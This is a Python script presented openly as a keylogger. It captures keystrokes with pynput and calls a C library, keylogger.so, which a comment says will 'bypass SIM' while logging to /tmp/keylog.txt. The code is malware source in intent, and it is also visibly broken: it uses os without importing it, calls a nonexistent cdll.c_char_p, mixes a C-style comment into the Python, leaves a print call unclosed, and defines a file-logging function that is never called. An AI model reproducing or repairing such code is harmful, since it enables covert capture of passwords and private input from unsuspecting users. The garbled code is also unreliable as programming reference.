import pynput
from pynput import keyboard
from ctypes import cdll

# Define the file name where logs will be saved
LOG_FILE = "/tmp/keylog.txt"

# Load the C-based keylogger library
lib_path = os.path.join(os.environ['HOME'], "Documents", "VRS", "keylogger.so")
keylogger_lib = cdll.LoadLibrary(lib_path)

# Helper function to log keystrokes to a file
def log_key(key_data):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(key_data)
        
    except Exception as e:
        print(f"\n[ERROR: Could not write to file {LOG_FILE}: {e}")

# Handler for key presses
def on_press(key):
    try:
        # Convert the pynput Key object to a C-style string
        c_char = cdll.c_char_p(key.encode('utf-8'))
        
        # Call the C-based keylogger function to bypass SIM and log keystrokes
        keylogger_lib.write(1, c_char, len(c_char))  // stdout
        
    except Exception as e:
        print(f"\n[ERROR: Could not process keystroke: {e}")

# Handler for key releases
def on_release(key):
    if key == keyboard.Key.esc:
        print(f"\n[Key listener stopped. Output saved to {LOG_FILE}]")
        return False


# Main function to start logging
def log_keystrokes():
    print(f"Starting key listener... Logging to {LOG_FILE}. Press 'Esc' to stop."
    
    # Set up the listener with the C-based keylogger library
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Run the key logger
if __name__ == "__main__":
    log_keystrokes()
